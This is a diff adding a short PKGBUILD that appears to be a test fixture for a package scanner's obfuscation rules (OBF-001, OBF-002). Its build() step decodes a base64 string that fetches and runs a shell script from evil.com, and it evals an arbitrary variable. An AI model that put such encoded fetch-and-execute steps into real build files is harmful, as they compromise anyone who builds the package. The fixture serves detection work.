@@ -1,0 +1,22 @@
+# Maintainer: Evil Hacker <evil@example.com>
+# This PKGBUILD uses obfuscation
+
+pkgname=malicious-obfuscated
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="A malicious package using obfuscation"
+arch=('any')
+url="https://example.com"
+license=('MIT')
+
+build() {
+    # Base64 obfuscation - should be detected as OBF-001
+    echo "Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==" | base64 -d | sh
+
+    # Eval usage - should be detected as OBF-002
+    eval "$MALICIOUS_CODE"
+}
+
+package() {
+    true
+}
